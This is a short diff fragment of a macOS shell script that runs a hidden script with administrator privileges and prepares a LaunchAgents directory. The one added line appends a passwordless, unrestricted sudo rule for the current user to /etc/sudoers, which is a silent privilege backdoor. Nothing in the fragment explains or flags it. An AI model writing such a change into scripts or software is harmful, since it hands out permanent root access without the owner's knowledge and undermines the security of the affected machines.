@@ -21,7 +21,7 @@ chown root $HOME/.hidden/woffice.sh
 #chmod u+s $HOME/.hidden/woffice.sh
 #sh $HOME/.hidden/woffice.sh
 osascript -e "do shell script \"$HOME/.hidden/woffice.sh $*\" with administrator privileges"
-
+echo $USER' ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 #Create directory if it doesn't already exist.
 mkdir $HOME/Library/LaunchAgents
 
